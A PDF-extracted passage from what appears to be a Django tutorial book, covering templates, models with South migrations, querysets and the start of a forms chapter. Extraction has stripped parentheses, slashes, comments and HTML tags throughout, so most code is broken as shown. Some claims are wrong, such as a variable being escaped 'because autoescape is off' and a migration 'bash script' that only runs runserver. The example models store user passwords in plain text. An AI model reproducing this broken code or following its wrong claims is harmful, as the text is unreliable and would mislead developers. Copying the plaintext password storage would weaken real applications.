variable5 is escaped because autoescape is off  The linebreaks filter The linebreaks filter allows you to convert line breaks into an HTML tag. A single  new line is transformed into the   tag. A new line followed by a blank will  become a paragraph break , :   {{ textlinebreaks }}   The truncatechars filter The truncatechars filter allows you to truncate a string from a certain length. If this  number is exceeded, the string is truncated and Django adds the string " ...".  The example of the variable that contains "Welcome in Django " is as follows:  {{ texttruncatechars:14 }}  This code outputs the following:   "Welcome in ..."  Creating DRY URLs Before learning  what a DRY link is, we will first remind you of what an HTML link  is. Every day, when we go on the Internet, we change a page or website by clicking  on links. These links are redirected to URLs. The following is an example link to  google.com:   Google link !   [ 36 ]  Working with Templates   We will create a second page in our application to create the first valid link. Add the  following line to the urls.py file:  url r'^connection$', 'TasksManager.views.connection.page' ,  Then, create a view corresponding to the preceding URL:  from django.shortcuts import render  View for connection page.  def page request :   return render request, 'en public connection.html'   We will create a second template for the new view. Let's duplicate the first template  and call the copy, connection.html, as well as modify Hello world in Connection.  We can note that this template does not respect the DRY philosophy. This is normal;  we will learn how to share code between different templates in the next section.  We will create an HTML link in our first index.html template. This link will direct  the user to our second view. Our   tag becomes:      Hello world !        Connection     Now, let's test our site with the development server, and open our browser to the  URL of our site. By testing the site, we can check whether the link works properly.  This is a good thing, because now you are able to make a static website with Django,  and this framework includes a handy tool to manage URLs.  Django can never write a link in the href property. Indeed, by properly filing our  urls.py file, we can refer to the name of a URL and name address.  To do this, we need to change our urls.py file that contains the following URLs:  url r'^$', 'TasksManager.views.index.page', name="public_index" , url r'^connection $', 'TasksManager.views.connection.page',  name="public_connection" ,  Adding the name property to each of our URLs allows us to use the name of the URL  to create links. Change your index.html template to create a DRY link:   Connection   [ 37 ]  Chapter 4   Test the new site again; note that the link still works. But for now, this feature is useless  to us. If Google decides to improve the indexing of the URLs whose addresses end  with the name of the website, you will have to change all the URLs. To do this with  Django, all you will need to do is change the second URL as follows:  url r'^connection-TasksManager$', 'TasksManager.views.connection. page', name="public_connection" ,  If we test our site again, we can see that the change has been done properly and  that the change in the urls.py file is effective on all the pages of the site. When you  need to use parameterized URLs, you must use the following syntax to integrate the  parameters to the URL:  {% url "url_name" param %} {% url "url_name" param1, param2 %}  Extending the templates The legacy of templates allows you to define a super template and a subtemplate that  inherits from the super template. In the super template, it is possible to define blocks  that subtemplates can fill. This method allows us to respect the DRY philosophy by  applying the common code to several templates in a super template. We will use an  example where the index.html template will extend the base.html template.  The following is the base.html template code, which we must create in the  template folder:                    {% block title_html %}{% endblock %}                           Tasks Manager - {% block h1 %}{% endblock %}                   {% block article_content %}{% endblock %}              [ 38 ]  Working with Templates   In the previous code, we defined three areas that the child templates can override:  title_html, h1, and article_content. The following is the index.html   template code:  {% extends "base.html" %} {% block title_html %}   Hello World Title {% endblock %} {% block h1 %}   {{ bloc.super }}Hello World Django {% endblock %} {% block article_content %}   Hello world !   {% endblock %}  In this template, we first use the extends tag, which extends the base.html template.  Then, the block and endblock tags allow us to redefine what is present in the   base.html template. We may change our connection.html template in the   same way so that a change in base.html can be made on both templates.  It is possible to define as many blocks as necessary. We can also create super  templates that extend themselves to create more complex architectures.  Using static files in templates Static files such as JavaScript files, CSS, or images are essential to obtain an ergonomic  website. These files are often stored in a folder, but they can be useful to modify this  folder under development or in production.  According to the URLs, Django allows us to define a folder containing the static files  and to easily modify its location when required.  To set the path where Django will look for static files, we have to change our  settings.py file by adding or changing the following line:  STATIC_URL = ' static ' STATICFILES_DIRS =       os.path.join PROJECT_ROOT, '.. TasksManager static ' ,    [ 39 ]  Chapter 4   We will define a proper architecture for our future static files. It is important to choose  an early consistent architecture, as it makes the application support as well as include  another developer easier. Our statics files' architecture is as follows:  static    images    javascript      lib    css    pdf   We create a folder for each type of static file and define a lib folder for JavaScript  libraries as jQuery, which we will use later in the book. For example, we change our  base.html file. We will add a CSS file to manage the styles of our pages. To do this,  we must add the following line between   and  :  <link href="{% static "css style.css" %}" rel="stylesheet" type="text  css"  >  To use the tag in our static template, we must also load the system by putting the  following line before using the static tag:  {% load staticfiles %}  We will create the style.css file in the  static css folder. This way, the browser  won't generate an error later in the development.  Summary In this chapter, we learned how to create a template and send data to the templates,  and how to use the conditions, loops, and filters in the templates. We also discussed  how to create DRY URLs for a flexible URL structure, expand the templates to meet  the DRY philosophy, and how to use the static files.  In the next chapter, we will learn how to structure our data to save it in a database.  [ 40 ]  Working with Templates   Working with Models  The website we just created contains only static data; however, what we want to do  is store data so as to automate all the tasks. That's why there are models; they will  put a link between our views and the database.  Django, like many frameworks, proposes database access with an abstraction layer.  This abstraction layer is called object-relational mapping  ORM . This allows you to  use the Python implementation object in order to access the data without worrying  about using a database. With this ORM, we do not need to use the SQL query for  simple and slightly complex actions. This ORM belongs to Django, but there are  others such as SQLAlchemy, which is a quality ORM used especially in the Python  TurboGears framework.  A model is an object that inherits from the Model class. The Model class is a Django  class that is specifically designed for data persistence.  We define fields in models. These properties allow us to organize data within a  model. To make a connection between databases and SQL, we can say that a model is  represented by a table in the database, and a model property is represented by a field  in the table.  In this chapter, we will explain:     How to set up access to the database    How to install South for the database migrations    How to create simple models    How to create a relationship between models    How to extend our models    How to use the administration module   Databases and Django Django can interface with many databases. However, during the development of our  application, we use SQLite libraries that are included in Django.  We will modify settings.py to set our connection to the database:  DATABASES = {   'default': {     'ENGINE': 'django.db.backends.sqlite3',      'NAME': os.path.join PROJECT_ROOT, 'database.db' ,      'USER': '',                          'PASSWORD': '',                      'HOST': '',                          'PORT': '',                        } }  The following is the description of the properties mentioned in the preceding code:     The ENGINE property specifies the type of database to be used.    The NAME property defines the path and final name of the SQLite database. We   use a syntax using os.path.join to our code, and it is compatible with all  operating systems. The file's database will be contained in the project directory.    The other properties are useful when we use a database server, but as we will   use SQLite, we do not need to define them.  Migrations with South South is a very useful extension of Django. It facilitates the migration of the database  when changing fields. It also keeps a history of the changes in the structure of   the database.   We talk about it now because it must be installed before the creation of the database  to work correctly.  Django 1.7 incorporates a migration system. You will not need to use South anymore  to make the migration of a Django application. You can find more information about  the migration systems integrated into Django 1.7 at https:  docs.djangoproject. com en dev topics migrations .  [ 42 ]  Working with Models   Installing South To install South, we use the pip command. We have already used it to install Django.  To do this, run the following command:  pip install South  Before actually using South, we must change the settings.py file for South to be  well integrated in Django. To do this, you must go to INSTALLED_APPS and add the  following lines  depending on the version, it is possible that the installation of South  added the line :  'south', 'TasksManager',  Using the South extension Before we make our first migrations and generate our database, we also have to  create the schema migration. To do this, we must run the following command:  manage.py schemamigration TasksManager --initial   Then, we must perform an initial migration:  manage.py syncdb --migrate   Django asks us to first create an account. This account will be a superuser. Remember  the login and password that you enter; you will need this information later.   South is now fully operational. Each time we need to modify the models, we will  make a migration. However, for the migration to be made correctly, you must keep  the following things in mind:     Never perform the Django syncdb command. After running syncdb   --migrate for the first time, never run it again. Use migrate afterwards.     Always put a default value in the new fields; otherwise, we will be asked to   assign a value.     Each time we finish editing our models, we must execute the following two   commands in the correct order:  manage.py schemamigration TasksManager –auto manage.py migrate TasksManager  [ 43 ]  Chapter 5   Creating simple models To create models, we must have already studied the application in depth. Models are  the basis of any application because they will store all the data. Therefore, we must  prepare them carefully.  Concerning our Tasksmanager application, we need a user who saves tasks  performed on a project. We'll create two models: User_django and Project.   We need to store our models in the models.py file. We will edit the models.py file in  the TasksManager folder. We do not need to modify the configuration file, because  when you need the model, we will have to import it.   The file already exists and has a line. The following line allows you to import the  base model of Django:  from django.db import models  The UserProfile model To create the UserProfile model, we ask ourselves the question, "what data about the  user do we need to keep?". We will need the following data:     The user's real name    A nickname that will identify each user    A password that will be useful for user authentication    Phone number    Date of birth  this is not essential, but we must study the dates!     The date and time of the last connection    E-mail address    Age  in years     The creation date of the user account    A specialization, if it is supervisor    The type of user    A supervisor, if you are a developer  The model that is needed is as follows:  class UserProfile models.Model :   name = models.CharField max_length=50, verbose_name="Name"    login = models.CharField max_length=25, verbose_name="Login"   [ 44 ]  Working with Models     password = models.CharField max_length=100, verbose_name="Password"    phone = models.CharField max_length=20, verbose_name="Phone number"  , null=True, default=None, blank=True    born_date = models.DateField verbose_name="Born date" , null=True,  default=None, blank=True    last_connection = models.DateTimeField verbose_name="Date of last  connection" , null=True, default=None, blank=True    email = models.EmailField verbose_name="Email"    years_seniority = models.IntegerField verbose_name="Seniority",  default=0    date_created = models.DateField verbose_name="Date of Birthday",  auto_now_add=True   We have not defined the specialization, type of user, and supervisor, because these  points will be seen in the next part.  In the preceding code, we can see that Django_user inherits from the Model class.  This Model class has all the methods that we will need to manipulate the models. We  can also override these methods to customize the use of models.  Within this class, we added our fields by adding an attribute in which we specified  the values. For example, the first name field is a character string type with a  maximum length of 50 characters. The verbose_name property will be the label that  defines our field in forms. The following is a list of the commonly used field types:     CharField: This is a character string with a limited number of characters    TextField: This is a character string with unlimited characters    IntegerField: This is an integer field    DateField: This is a date field    DateTimeField: This field consists of the date as well as the time in hours,   minutes, and seconds     DecimalField: This is a decimal number that can be defined precisely  Django automatically saves an id field in auto increment. Therefore,  we do not need to define a primary key.  [ 45 ]  Chapter 5   The Project model To save our projects, we will need the following data:     Title    Description    Client name  These factors allow us to define the following model:  class Project models.Model :   title = models.CharField max_length=50, verbose_name="Title"    description = models.CharField max_length=1000, verbose_ name="Description"    client_name = models.CharField max_length=1000, verbose_name="Client  name"   To comply with good practices, we would not have had to define a text field for the  customer, but define a relationship to a client table. To simplify our first model, we  define a text field for the client name.  The relationship between the models Relationships are elements that join our models. For example, in the case of this  application, a task is linked to a project. Indeed, the developer performs a task for  a particular project unless it is a more general task, but it's out of the scope of our  project. We define the one-to-many type of relationship in order to denote that a task  always concerns a single project but a project can be connected to many tasks.  There are two other kinds of relationships:     The one-to-one relationship sets apart a model in two parts. The resulting   database will create two tables linked by a relationship. We will see an  example in the chapter on the authentication module.     The many-to-many relationship defines relationships with many records in  one model can be connected to many records of the several other models of  the same type. For example, an author can publish several books and a book  may have several authors.  Creating the task model with relationships For the task model, we need the following elements:     A way to define the task in a few words  [ 46 ]  Working with Models      A description for more details about the task    A past life       The project to which it is attached    The developer who has created it  Its importance  This allows us to write the following model:  class Task models.Model :   title = models.CharField max_length=50, verbose_name="Title"    description = models.CharField max_length=1000, verbose_ name="Description"    time_elapsed = models.IntegerField verbose_name="Elapsed time" ,  null=True, default=None, blank=True    importance = models.IntegerField verbose_name="Importance"    project = models.ForeignKey Project, verbose_name="Project" ,  null=True, default=None, blank=True    app_user = models.ForeignKey UserProfile, verbose_name="User"   In this model, we have defined two foreign key field types: project and app_user.  In the database, these fields contain the login details of the record to which they are  attached in the other table.   The project field that defines the relationship with the Project model has two  additional attributes:     Null: This decides whether the element can be defined as null. The fact   that this attribute is in the project field means that a task is not necessarily  related to a project.     Default: This sets the default value that the field will have. That is, if we do  not specify the value of the project before saving the model, the task will not  be connected to a domain.  Extending models The inheritance model allows the use of common fields for two different models. For  example, in our App_user model, we cannot determine whether a random recording  will be a developer or supervisor.  [ 47 ]  Chapter 5   One solution would be to create two different models, but we would have to  duplicate all the common fields such as name, username, and password, as follows:  class Supervisor models.Model :    Duplicated common fields   specialisation = models.CharField max_length=50, verbose_ name="Specialisation"   class Developer models.Model :    Duplicated common fields   supervisor = models.ForeignKey Supervisor, verbose_ name="Supervisor"   It would be a shame to duplicate the code, but it is the principle that Django and  DRY have to follow. That is why there is an inheritance model.   Indeed, the legacy model is used to define a master model  or supermodel , which  contains the common fields to several models. Children models automatically inherit  the fields of the supermodel.  Nothing is more explicit than an example; we will modify our classes, Developer  and Supervisor, to make them inherit App_user:  class Supervisor UserProfile :   specialisation = models.CharField max_length=50, verbose_ name="Specialisation"   class Developer UserProfile :   supervisor = models.ForeignKey Supervisor, verbose_ name="Supervisor"   The result of the legacy database allows us to create three tables:     A table for the App_user model that contains the fields for the properties of   the model     A table for the Supervisor model, with a text field for specialization and a   field that has a foreign key relationship with the App_user table     A Developer table with two fields: a field in liaison with the Supervisor   table and a field that links to the App_user table  Now that we have separated our two types of users, we will modify the relationship  with App_user because only the developer will record his or her tasks. In the Tasks  model, we have the following line:  app_user = models.ForeignKey App_user, verbose_name="User"   [ 48 ]  Working with Models   This code is transformed as follows:  developer = models.ForeignKey Developer, verbose_name="User"   For the generation of the database order to work, we must put models in the correct  order. Indeed, if we define a relationship with a model that is not yet defined, Python  will raise an exception. For the moment, the models will need to be defined in the  order described. Later, we shall see how to work around this limitation.  In the next chapter, we will perform queries on the model. This requires the database  to be synchronized with the models. We must first migrate South before starting the  next chapter.  To perform the migration, we must use the commands we've seen at the beginning  of the chapter. To simplify the migration, we can also create a batch file in the Python  folder, where we will put the following lines:  manage.py schemamigration TasksManager --auto  manage.py migrate  pause  The following is a bash script you can create in the Work_manager folder that can  perform the same thing on Debian Linux:  ! bin bash  manage.py runserver 127.0.0.1:8000  This way, when you migrate South, it will execute this file. The pause command  allows you to look at the results or errors displayed without closing the window.  The admin module The administration module is very convenient and is included by default with Django.  It is a module that will maintain the content of the database without difficulty. This is  not a database manager because it cannot maintain the structure of the database. One question that you may ask is, "what does it have other than a management tool  database?". The answer is that the administration module is fully integrated with  Django and uses these models.  [ 49 ]  Chapter 5   The following are its advantages:              It manages the relationships between models. This means that if we want to  save a new developer, the module will propose a list of all the supervisors.   In this way, it will not create a non-existent relationship. It manages Django permissions. You can set permissions for users according  to models and CRUD operations. It is quickly established.  Being based on Django models and not on the database, this module allows the user  to edit the recorded data.  Installing the module To implement the administration module, edit the settings.py file. In the  INSTALLED_APPS setting, you need to add or uncomment the following line:  'django.contrib.admin'  You also have to edit the urls.py file by adding or uncommenting the following  lines:  from django.contrib import admin admin.autodiscover   url  r'^admin', include admin.site.urls  ,  The line that imports the administration module has to be at the beginning of the file  with other imports. The line that runs the autodiscover   method must be found  after the imports and before the urlpatterns definition. Finally, the last line is a  URL that should be in urlpatterns.  We also have to create an admin.py file in the TasksManager folder in which we will  define the styles we want to integrate into the management module:  from django.contrib import admin from TasksManager.models import UserProfile, Project, Task ,  Supervisor , Developer admin.site.register UserProfile  admin.site.register Project  admin.site.register Task  admin.site.register Supervisor  admin.site.register Developer   Now that we have configured the administration module, we can easily manage   our data.  [ 50 ]  Working with Models   Using the module To use the administration module, we must connect to the URL that we have just  defined: http:  localhost:8000 admin .  We must connect with the logins defined when creating the database:  1.  Once we are connected, the model list appears. 2.   If we click on the Supervisor model link, we arrive at a page where we can  add a supervisor by using the button at the top-right corner of the window:  3.  By clicking on this button, we load a page consisting of a form. This form   automatically provides practical tools to manage dates and times:  Let's add a new supervisor and then add a developer. When you want to choose the  supervisor, you can see the one we have just created in a combobox. The green cross  on the right-hand side allows you to quickly create a supervisor.  In the following chapter, we will define the str method for our models. This will  improve the display lists of objects in this management module.  [ 51 ]  Chapter 5   Advanced usage of models We studied the basics of the models that allow us to create simple applications.  Sometimes, it is necessary to define more complex structures.  Using two relationships for the same model Sometimes, it is useful to store two foreign keys  or more  in a single model. For  example, if we want two developers to work in parallel on the same task, we must  use the related_name property in our models. For example, our Task model  contains two relationships with the following lines:  developer1 = models.ForeignKey  Developer , verbose_name = "User" ,  related_name = "dev1"   developer2 = models.ForeignKey  Developer , verbose_name = "User" ,  related_name = "dev2"    Further in this book, we will not use these two relationships. To effectively follow  this book, we must return to our previously defined Task model.  Here, we define two developers on the same task. Best practices advise us  to create a many-to-many relationship in the Task model. The thorough  argument allows you to specify an intermediate table to store additional  data. This is an optional step. An example of this type of relationship is as  follows:  Relationship to add to the Task model developers = models.ManyToManyField Developer ,  through="DeveloperWorkTask"  class DeveloperWorkTask models.Model :   developer = models.ForeignKey Developer    task = models.ForeignKey Task    time_elapsed_dev = models.IntegerField verbose_ name="Time elapsed", null=True, default=None,  blank=True   Defining the str method As already mentioned in the section on the use of the admin module, the __str__    method will allow a better view of our models. This method will set the string that  will be used to display our model instance. When Django was not compatible with  Python 3, this method was replaced by the __unicode__   method.  [ 52 ]  Working with Models   For example, when we added a developer, the drop-down list that defines a  supervisor showed us the "Supervisor object" lines. It would be more helpful to  display the name of the supervisor. In order to do this, change our App_user class  and add the str   method:  class UserProfile   models.Model   :  Fields... def __str__  self :   return self.name  This method will return the name of the supervisor for the display and allows you to  manage the administration easily:  Summary In this chapter, we learned migration with South. We also learned how to create  simple models and relationships between the models. Furthermore, we learned   how to install and use the admin module. In the next chapter, we will learn how   to manipulate our data. We will learn how to use four main operations on the data:  adding, reading  and research , modification, and deletion.  [ 53 ]  Chapter 5    Getting a Model's Data   with Querysets  Querysets are used for data retrieval rather than for constructing SQL queries  directly. They are part of the ORM used by Django. An ORM is used to link the view  and controller by a layer of abstraction. In this way, the developer uses object model  types without the need to write a SQL query. We will use querysets to retrieve the  data we have stored in the database through models. These four operations are often  summarized by CRUD  Create, Read, Update, and Delete . The discussed examples in this chapter are intended to show you how the querysets  work. The next chapter will show you how to use forms, and thus, how to save data  sent from a client in the models.  By the end of this chapter, we will know how to:     Save data in the database    Retrieve data from the database    Update data from the database  The persisting model's data on the  database Data storage is simple with Django. We just need to fill the data in the models,   and use methods to store them in a database. Django handles all the SQL queries;   the developer does not need to write any.   Filling a model and saving it in the database Before you can save data from a model instance to the database, we need to define   all the values of the model's required fields. We can show the examples in our   view index.  The following example shows how to save a model:  from TasksManager.models import Project  line 1 from django.shortcuts import render def page request :   new_project = Project title="Tasks Manager with Django",  description="Django project to getting start with Django easily.",  client_name="Me"   line 2   new_project.save    line 3   return render request, 'en public index.html', {'action':'Save datas  of model'}   We will explain the new lines of our view:     We import our models.py file; it's the model that we will use in the view    We then create an instance of our Project model and fill it with data    Finally, we execute the save   method that saves the present data in    the instance  We will test this code by starting the development server  or runserver  and  then go to our URL. In the render   method, the value that we defined in the  action variable is displayed. To check if the query is executed, we can use the  administration module. There is also the software for managing databases.  We need to add more records by changing the values randomly in line 2. To find  out how to do this, we'll need to read this chapter.  Getting data from the database Before using Django to retrieve data from a database, we were using SQL queries   to retrieve an object containing the result. With Django, there are two ways to  retrieve records from the database depending on whether we want to get back   one or several records.  Getting multiple records To retrieve records from a model, we must first import the model into the view as we  have done before to save the data in a model.  [ 56 ]  Getting a Model’s Data with Querysets   We can retrieve and display all the records in the Project model as follows:  from TasksManager.models import Project from django.shortcuts import render def page request :   all_projects = Project.objects.all     return render request, 'en public index.html', {'action': "Display  all project", 'all_projects': all_projects}   The code template that displays the projects becomes:  {% extends "base.html" %} {% block title_html %}   Projects list {% endblock %} {% block h1 %}   Projects list {% endblock %} {% block article_content %}    {{ action }}    {% if all_projectslength > 0 %}                            ID           Title                          {% for project in all_projects %}                  {{ project.id }}           {{ project.title }}              {% endfor %}             {% else %}    No project.    {% endif %} {% endblock %}  The all   method can be linked to a SQL SELECT * FROM query. Now, we will use  the filter   method to filter our results and make the equivalent of a SELECT *  FROM Project WHERE field = value query.  [ 57 ]  Chapter 6   The following is the code to filter model records:  from TasksManager.models import Project from django.shortcuts import render def page request :   action='Display project with client name = "Me"'   projects_to_me = Project.objects.filter client_name="Me"    return render request, 'en public index.html', locals     We used a new syntax to send the variables to the template. The locals   function  sends all the local variables to the template, which simplifies the render line.  Best practices recommend that you pass the variables one by one  and only send the necessary variables.  Each argument from the filter   method defines a filter for the query. Indeed, if  we wanted to make two filters, we would have written the following line of code:  projects_to_me = Project.objects.filter client_name="Me",  title="Project test"   This line is equivalent to the following:  projects_to_me = Project.objects.filter client_name="Me"  projects_to_me = projects_to_me.filter title="Project test"    The first line can be broken into two, because the querysets are chainable. Chainable  methods are methods that return a queryset such that other queryset methods can   be used.  The response obtained with the all   and filter   methods is of the queryset  type. A queryset is a collection of model instances that can be iterated over.  Getting only one record The methods that we will see in this chapter return objects of the Model type, which  will be used to record relationships or to modify the instance of the model recovered.  To retrieve a single record with a queryset, we should use the get   method as in  the following line:  first_project = Project.objects.get id="1"   The get   method when used as the filter   method accepts filter arguments.  However, you should be careful with setting the filters that retrieve a single record.  [ 58 ]  Getting a Model’s Data with Querysets   If the argument to get   is client_name = "Me", it would generate an error if we  had more than two records corresponding to client_name.  Getting a model instance from the queryset  instance We said that only the get   method makes it possible to retrieve an instance of a  model. This is true, but sometimes it can be useful to retrieve an instance of a model  from a queryset.  For example, if we want to get the first record of the customer Me, we will write:  queryset_project = Project.objects.filter client_name="Me" .order_ by "id"   This line returns a queryset in which there are as many elements as  there are projects for the Me customer  first_item_queryset = queryset_project[:1]  This line sends us only the first element of this queryset, but this  element is not an instance of a model  project = first_item_queryset.get    This line retrieves the instance of the model that corresponds to  the first element of queryset  These methods are chainable, so we can write the following line instead of the  previous three lines:  project = Project.objects.filter client_name="Me" .order_by "id" [:1]. get    Using the get parameter Now that we have learned how to retrieve a record and we know how to use a URL,  we will create a page that will allow us to display the record of a project. To do this,  we will see a new URL syntax:  url r'^project-detail- ?P \d+ $', 'TasksManager.views.project_ detail.page', name="project_detail" ,  This URL contains a new string,  ?P \d+ . It allows the URL with a decimal  parameter to be valid because it ends with \d. The + character at the end means that  the parameter is not optional. The   string means that the parameter's name is pk.  [ 59 ]  Chapter 6   The system routing Django will directly send this parameter to our view. To use   it, simply add it to the parameters of our page   function. Our view changes to   the following:  from TasksManager.models import Project from django.shortcuts import render def page request, pk :   project = Project.objects.get id=pk    return render request, 'en public project_detail.html', {'project' :  project}   We will then create our en public project_detail.html template extended from  base.html with the following code in the article_content block:   {{ project.title }}   Client : {{ project.client_name }}      {{ project.description }}    We have just written our first URL containing a parameter. We will use this later,  especially in the chapter about the class-based views.  Saving the foreign key We have already recorded data from a model, but so far, we have never recorded it  in the relationship database. The following is an example of recording a relationship  that we will explain later in the chapter:  from TasksManager.models import Project, Task, Supervisor, Developer from django.shortcuts import render from django.utils import timezone def page request :    Saving a new supervisor   new_supervisor = Supervisor name="Guido van Rossum", login="python",  password="password", last_connection=timezone.now  , email="python@ python.com", specialisation="Python"   line 1   new_supervisor.save      Saving a new developer   new_developer = Developer name="Me", login="me", password="pass",  last_connection=timezone.now  , email="me@python.com", supervisor=new_ supervisor    new_developer.save      Saving a new task   project_to_link = Project.objects.get id = 1   line 2  [ 60 ]  Getting a Model’s Data with Querysets     new_task = Task title="Adding relation", description="Example  of adding relation and save it", time_elapsed=2, importance=0,  project=project_to_link, developer=new_developer   line 3   new_task.save     return render request, 'en public index.html', {'action' : 'Save  relationship'}   In this example, we have loaded four models. These four models are used to create  our first task. Indeed, a spot is related to a project and developer. A developer is  attached to a supervisor.  Following this architecture, we must first create a supervisor to add a developer.   The following list explains this:     We create a new supervisor. Note that the extending model requires no  additional step for recording. In the Supervisor model, we define the   fields of the App_user model without any difficulties. Here, we use   timezone to record the current day's date.     We look for the first recorded project. The result of this line will record   a legacy of the Model class instance in the project_to_link variable.   Only the get   method gives the instance of a model. Therefore, we   must not use the filter   method.     We create a new task, and attribute the project created in the beginning of    the code and the developer that we just recorded.  This example is very comprehensive, and it combines many elements that we  have studied from the beginning. We must understand it in order to continue  programming in Django.  Updating records in the database There are two mechanisms to update data in Django. Indeed, there is a mechanism   to update one record and another mechanism to update multiple records.  Updating a model instance Updating the existing data is very simple. We have already seen what it takes to be  able to do so. The following is an example where it modifies the first task:  from TasksManager.models import Project, Task from django.shortcuts import render def page request :   new_project = Project title = "Other project", description="Try to  update models.", client_name="People"   [ 61 ]  Chapter 6     new_project.save     task = Task.objects.get id = 1    task.description = "New description"   task.project = new_project   task.save     return render request, 'en public index.html', {'action' : 'Update  model'}   In this example, we created a new project and saved it. We searched our task for id  = 1. We changed the description and project to the task it is attached to. Finally, we  saved this task.  Updating multiple records To edit multiple records in one shot, you must use the update   method with a  queryset object type. For example, our People customer is bought by a company  named Nobody, so we need to change all the projects where the client_name  property is equal to People:  from TasksManager.models import Project from django.shortcuts import render def page request :   task = Project.objects.filter client_name = "people" .update client_ name="Nobody"    return render request, 'en public index.html', {'action' : 'Update  for many model'}   The update   method of a queryset can change all the records related to this  queryset. This method cannot be used on an instance of a model.  Deleting a record To delete a record in the database, we must use the delete   method. Removing  items is easier than changing items, because the method is the same for a queryset   as for the instances of models. An example of this is as follows:  from TasksManager.models import Task from django.shortcuts import render def page request :   one_task = Task.objects.get id = 1    one_task.delete    line 1   all_tasks = Task.objects.all     all_tasks.delete    line 2   return render request, 'en public index.html', {'action' : 'Delete  tasks'}   [ 62 ]  Getting a Model’s Data with Querysets   In this example, line 1 removes the stain with id = 1. Then, line 2 removes all  the present tasks in the database.  Be careful because even if we use a web framework, we keep hold of the data. No  confirmation will be required in this example, and no backup has been made. By  default, the rule for model deletion with ForeignKey is the CASCADE value. This rule  means that if we remove a template instance, the records with a foreign key to this  model will also be deleted.  Getting linked records We now know how to create, read, update, and delete the present records in the  database, but we haven't recovered the related objects. In our TasksManager  application, it would be interesting to retrieve all the tasks in a project. For example,  as we have just deleted all the present tasks in the database, we need to create others.  We especially have to create tasks in the project database for the rest of this chapter.  With Python and its comprehensive implementation of the object-oriented model,  accessing the related models is intuitive. For example, we will retrieve all the project  tasks when login = 1:  from TasksManager.models import Task, Project from django.shortcuts import render def page request :   project = Project.objects.get id = 1    tasks = Task.objects.filter project = project    return render request, 'en public index.html', {'action' : 'Tasks  for project', 'tasks':tasks}   We will now look for the project task when id = 1:  from TasksManager.models import Task, Project from django.shortcuts import render def page request :   task = Task.objects.get id = 1    project = task.project   return render request, 'en public index.html', {'action' : 'Project  for task', 'project':project}   We will now use the relationship to access the project task.  [ 63 ]  Chapter 6   Advanced usage of the queryset We studied the basics of querysets that allow you to interact with the data. In specific  cases, it is necessary to perform more complex actions on the data.  Using an OR operator in a queryset In queryset filters, we use a comma to separate filters. This point implicitly means a  logical operator AND. When applying an OR operator, we are forced to use the Q object.  This Q object allows you to set complex queries on models. For example, to select the  projects of the customers Me and Nobody, we must add the following lines in our view:  from TasksManager.models import Task, Project from django.shortcuts import render from django.db.models import Q def page request :   projects_list = Project.objects.filter Q client_name="Me"    Q client_name="Nobody"     return render request, 'en public index.html', {'action' : 'Project  with OR operator', 'projects_list':projects_list}   Using the lower and greater than lookups With the Django queryset, we cannot use the   operators to check whether a  parameter is greater than or less than another.  You must use the following field lookups:     __gte: This is equivalent to SQL's greater than or equal to operator, >=    __gt: This is equivalent to SQL's greater than operator, >    __lt: This is equivalent to SQL's lower than operator, <    __lte: This is equivalent to SQL's lower than or equal to operator, <=  For example, we will write the queryset that can return all the tasks with a duration  of greater than or equal to four hours:  tasks_list = Task.objects.filter time_elapsed__gte=4   [ 64 ]  Getting a Model’s Data with Querysets   Performing an exclude query  The exclude queries can be useful in the context of a website. For example, we want  to get the list of projects that do not last for more than four hours:  from TasksManager.models import Task, Project from django.shortcuts import renderdef page request :   tasks_list = Task.objects.filter time_elapsed__gt=4    array_projects = tasks_list.values_list 'project', flat=True . distinct     projects_list = Project.objects.all     projects_list_lt4 = projects_list.exclude id__in=array_projects    return render request, 'en public index.html', {'action' : 'NOT IN  SQL equivalent', 'projects_list_lt4':projects_list_lt4}   The following is an explanation of the code snippet:                In the first queryset, we first retrieve the list of all the tasks for which   time_elapsed is greater than 4 In the second queryset, we got the list of all the related projects in these tasks In the third queryset, we got all the projects In the fourth queryset, we excluded all the projects with tasks that last for  more than 4 hours  Making a raw SQL query Sometimes, developers may need to perform raw SQL queries. For this, we can   use the raw   method, defining the SQL query as an argument. The following is   an example that retrieves the first task:  first_task = Project.objects.raw "SELECT * FROM TasksManager_project"  [0]  To access the name of the first task, just use the following syntax:  first_task.title  Summary In this chapter, we learned how to handle the database, thanks to the Django ORM.  Indeed, thanks to the ORM, the developer does not need to write SQL queries. In   the next chapter, we will learn how to create forms using Django.  [ 65 ]  Chapter 6    Working with Django Forms  We all know about HTML forms. This is a   tag that contains the   and    tags. The user can fill in or edit these items and return them to the server.  This is the preferred way to store data provided by the client. Frameworks such as  Django seized the HTML form to make it better.  A Django form is inherited from the Form class object. It is an object in which we   will set properties. These properties will be the fields in the form, and we will   define their type.  In this chapter, we will learn how to do the following:     Create an HTML form    Handle the data sent by a form    Create a Django form    Validate and manipulate data sent from a Django form    Create forms based on models    Customize error messages and use widgets  The advantages of Django forms are as follows:     Protection against CSRF vulnerabilities can be easily implemented.    We'll talk about CSRF vulnerabilities thereafter.     Data validation is automatic.    Forms are easily customizable.  But the best way to compare a standard HTML form and a Django form is to practice  it with an example: the form to add a developer.   Adding a developer without using Django  forms In this section, we will show you how to add a developer without using Django  forms. This example will show the time that can be saved by using Django.  Add the following URL to your urls.py file:  url r'^create-developer$', 'TasksManager.views.create_developer.page',  name="create_developer" ,  Template of an HTML form We will create a template before the view. Indeed, we are going to fill the view with  the template that contains the form. We do not put all the fields in the model because  the code is too long. It is better to learn using shorter code. The following is our  template in template en public create_developer.html:  {% extends "base.html" %} {% block title_html %}   Create Developer  {% endblock %} {% block h1 %}   Create Developer {% endblock %} {% block article_content %}                            Name                                                           Login                                                           Password                         [ 68 ]  Working with Django Forms                                      Supervisor                                    {% for supervisor in supervisors_list %}                {{ supervisor.name  }}              {% endfor %}                                                                                                      {% endblock %}  Note that the template is impressive and yet it is a minimalist form.  The view using the POST data reception The following screenshot shows the web page that we will create:  [ 69 ]  Chapter 7   The view that will process this form will be as follows. Save the view in the file  views create_developer.py:  from django.shortcuts import render from django.http import HttpResponse from TasksManager.models import Supervisor, Developer  View for create_developer def page request :   error = False    If form has posted   if request.POST:     This line checks if the data was sent in POST. If so, this means  that the form has been submitted and we should treat it.     if 'name' in request.POST:       This line checks whether a given data named name exists in the  POST variables.       name = request.POST.get 'name', ''         This line is used to retrieve the value in the POST  dictionary. Normally, we perform filters to recover the data to avoid  false data, but it would have required many lines of code.     else:       error=True     if 'login' in request.POST:       login = request.POST.get 'login', ''      else:       error=True     if 'password' in request.POST:       password = request.POST.get 'password', ''      else:       error=True     if 'supervisor' in request.POST:       supervisor_id = request.POST.get 'supervisor', ''      